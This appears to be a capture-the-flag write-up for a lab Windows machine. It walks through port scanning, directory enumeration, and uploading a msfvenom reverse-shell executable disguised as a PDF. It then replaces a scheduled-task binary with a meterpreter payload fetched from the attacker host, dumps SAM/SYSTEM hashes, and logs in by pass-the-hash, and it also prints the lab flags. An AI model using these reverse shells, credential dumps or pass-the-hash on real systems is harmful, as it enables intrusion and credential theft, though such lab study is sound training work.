# Windows Machine

## Machine Info





## Ports Scan

```bash
nmap -T4 -sV -p- --min-rate 1000 --open -oN port_scan.txt 10.200.150.151

Nmap scan report for 10.200.150.151
Host is up (0.056s latency).
Not shown: 63869 closed tcp ports (reset), 1651 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8081/tcp  open  http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
8443/tcp  open  ssl/http      Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```



## Breach&#x20;

<figure><img src="../../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>



### Dir/File Enum

Try to find a directory where the CV are uploaded.

{% code overflow="wrap" %}
```
gobuster dir -u http://10.200.150.151:8081/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

An atttacker with access to this directory could read all uploaded CV.



### Bypassing File Upload filter

The page allow a user to upload only PDF file. An atacker can create a .exe payload with msfvenom like this:

{% code overflow="wrap" %}
```bash
msfvenom --platform windows -p windows/shell_reverse_tcp LHOST=10.250.1.6 LPORT=9009 -f exe -o cv.exe
```
{% endcode %}

Then, rename the file into cv.exe.pdf to bypass the extension filter.

<figure><img src="../../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

When, someone open the file the .exe payload will execute and an attacker will obtain a reverse shell as user which has open the file.

<figure><img src="../../../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>



### User Flag

As a user we can get the user flag

```
more C:\user.txt

THM{cb7f295d-395a-4df1-9160-3036d89999d7}
```



## Privilege Escalation

### Insecure File Permissions

There are a file named `backup.exe` in the `C:\backup` directory that the `HT` user has Full rights.

```powershell
PS C:\backup> icacls backup.exe
icacls backup.exe
backup.exe NT AUTHORITY\SYSTEM:(I)(F)
           BUILTIN\Administrators:(I)(F)
           BUILTIN\Users:(I)(RX)
           JOBIFY\hr:(I)(F)
```

It's look like a file which run periodically by a Scheduled Task.

Check the Scheduled Task

```powershell
schtasks /query /fo LIST /v

Folder: \
HostName:                             JOBIFY
TaskName:                             \createBackup
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        7/1/2025 5:52:51 PM
Last Result:                          0
Author:                               JOBIFY\hr
Task To Run:                          C:\backup\backup.exe 
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          superAdmin
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

[..snip..]
```

An attacker can replace that executable with a malicious payload.

{% code title="Payload crafting" overflow="wrap" %}
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.250.1.6 LPORT=4444 -f exe  > backup.exe
```
{% endcode %}

```
PS C:\backup> rm backup.exe

PS C:\backup> curl http://10.250.1.6/backup.exe -o backup.exe

PS C:\backup>schtasks /run /tn createBackup
```

When the scheduled task will run, an attacker will obtain a session as `superadmin` user.

<figure><img src="../../../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>

### SeBackupPrivilege

An attacker with a session as Admin user can dump the SAM and SYSTEM file to obtain all local NTLM hash.

```
reg save hklm\sam c:\Temp\sam
reg save hklm\system c:\Temp\system
```

```
download sam
download system
```

```
impacket-secretsdump -sam sam -system system LOCAL
```

<figure><img src="../../../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

And then access through WinRM with the Pass-the-Hash technique.

### Access as Admin via WinRM

```bash
evil-winrm -i 10.200.150.151 -u 'Administrator' -H 'ce34537beb33e22cc4317c06605a5c2c'
```

<figure><img src="../../../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>



### Root Flag

```powershell
more C:\Users\Administrator\root.txt

THM{8697b02c-4577-4781-91ba-107d323e49b0}
```



## For mitigation

{% embed url="https://learn.microsoft.com/en-us/answers/questions/1087721/how-to-disable-seimpersonate-privilege-for-a-user" %}
